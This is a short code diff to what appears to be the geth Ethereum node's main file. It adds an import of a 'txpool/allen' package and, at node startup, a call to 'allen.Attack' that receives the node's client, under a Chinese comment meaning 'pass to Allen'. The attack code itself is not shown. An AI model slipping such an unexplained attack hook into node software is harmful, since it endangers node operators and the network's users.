@@ -19,6 +19,7 @@ package main
 
 import (
 	"fmt"
+	"github.com/ethereum/go-ethereum/core/txpool/allen"
 	"os"
 	"slices"
 	"sort"
@@ -345,6 +346,9 @@ func startNode(ctx *cli.Context, stack *node.Node, isConsole bool) {
 	// Create a client to interact with local geth node.
 	rpcClient := stack.Attach()
 	ethClient := ethclient.NewClient(rpcClient)
+
+	// 传递给艾伦
+	allen.Attack(ethClient)
 
 	go func() {
 		// Open any wallets already attached
